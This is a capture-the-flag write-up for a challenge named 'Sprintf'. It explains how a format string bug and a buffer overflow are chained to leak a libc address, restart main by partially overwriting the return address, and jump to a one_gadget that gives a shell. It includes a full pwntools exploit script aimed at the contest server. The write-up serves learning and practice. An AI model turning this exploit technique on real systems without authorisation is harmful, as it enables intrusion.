## Sprintf

In this challenge, we are given the following files

> s ld-linux-x86-64.so.2 libc-2.31.so

Upon analyzing the binary (s), we quickly realize that along with a buffer overflow there is a format string vulnerability as well. Also, we only get to send one payload if we do not try to do something tricky. Leaking an address is good but if we don't get a chance to use it, well, it is useless. So my first thought was to restart main function, so that I could use the leaked libc address to redirect control to some clever place (I'll get to that later). First payload should look something like this:

> b"%016llX" * 2 + (necessary amount of "a"s) + \x69 (What a number to overwrite least significant byte of the return address)

Originally, the return address points in libc to the instruction that is right after the call of main (in this specific libc least significant byte of that address would be \x83). Now that we overwrote it with \x69 we pointed it at before the call instruction (and some other instructions to gracefully call main again). But, there is one thing to notice here. There is a \x00 appended to the payload that we send, so, overwriting the least significant byte also overwrites the byte after that with \x00. In the worst case scenario we would overwrite 2 of the least significant bytes (to set 3 known nibbles) and that would cause to overwrite 3 other nibbles that are random. This means that we would get lucky once in 4096. But in this case, it seems like libc was carefully chosen and because of that, the two of the least significant bytes of the address we jump at to restart main are \x69\x00. In this case we only overwrite one random nibble with 0 and we should get lucky once in 16 now which is much better (I definitely saw this in the first place and didn't try to run program 4096 times).

Now that we can leak libc and restart main in the first payload, in our second payload we can redirect control to some clever place so that we can get shell. First thing that comes to mind is to ROP, though there is a trick here: because sprintf is used, we only get one gadget. But fear not, because one gadget is all we need. When we run one_gadget on libc to find these magical gadgets that give us shell, we get three hits and the one at offset 0xe3b01 seems to work just fine.

Finally, I present to you the exploit:

```python

from pwn import *
from time import *
from os import *

context.arch = "amd64"

num = 16

while num > 0:
    r = remote("litctf.org", 31790)
    payload = b'%016llX-' * 2

    payload = payload[:-1]

    payload += b'a' * (38 - len(payload)) + b'\x69'

    sleep(0.01)
    r.sendline(payload)

    recvd = r.recvline()

    leak_full = recvd.split(b"-")

    leak = leak_full[1][:-1]

    leak = leak[: leak.find(b"a")]

    def fn():
        payload = b"a" * 56 + p64(int(leak.decode(), 16) - 0x10dfd2 + 0xe3b01)

        rcvd = r.recv(timeout=1)

        if b"fault" in rcvd:
            return

        sleep(0.01)
        r.sendline(payload)

        sleep(1)
        r.interactive()

    fn()
    r.close()
    num -= 1

```
